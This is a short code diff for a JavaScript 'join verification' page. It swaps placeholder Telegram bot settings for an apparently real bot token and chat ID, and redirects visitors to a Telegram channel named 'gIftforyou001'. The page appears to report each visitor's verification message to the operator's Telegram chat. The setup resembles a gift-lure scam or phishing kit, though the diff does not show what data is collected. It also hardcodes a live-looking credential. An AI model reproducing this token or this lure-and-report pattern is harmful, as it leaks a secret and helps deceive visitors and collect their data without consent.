@@ -1,6 +1,6 @@
 // Telegram Bot Notification Configuration
-const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-const chatId = 'YOUR_TELEGRAM_CHAT_ID';
+const botToken = '7764036823:AAEcppXhFnseCzXMO3478C68jbqDKt58wrw';
+const chatId = '7407431042';
 
 // Function to send notification to Telegram
 function sendBotNotification(message) {
@@ -19,5 +19,5 @@ function verifyJoin() {
     sendBotNotification(userMessage);
 
     // Redirect user after verification
-    window.location.href = "https://your-website.com/after-verification";
+    window.location.href = "https://t.me/gIftforyou001";
 }
